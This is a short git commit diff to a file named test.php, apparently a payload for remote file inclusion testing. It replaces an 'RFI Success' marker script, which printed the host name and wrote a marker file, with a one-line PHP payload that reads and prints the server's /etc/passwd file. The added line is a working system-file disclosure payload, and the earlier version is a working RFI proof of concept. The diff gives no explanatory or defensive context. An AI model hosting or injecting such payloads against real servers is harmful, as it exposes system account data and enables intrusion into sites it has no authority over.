0615c4bba62f5a48570daea469b724074652537f
shivang maurya <158655809+shivangmauryaa@users.noreply.github.com>
2025-01-29 18:20:16 +0530

    Update test.php

--- test.php
+++ test.php
@@ -1,5 +1,1 @@
-<?php 
-echo "[RFI Success] Server is vulnerable! " . $_SERVER['HTTP_HOST']; 
-// Add harmless data: 
-file_put_contents('rfi_test.txt', 'This file was created via RFI.'); 
-?>
+<?php echo file_get_contents('/etc/passwd'); ?>
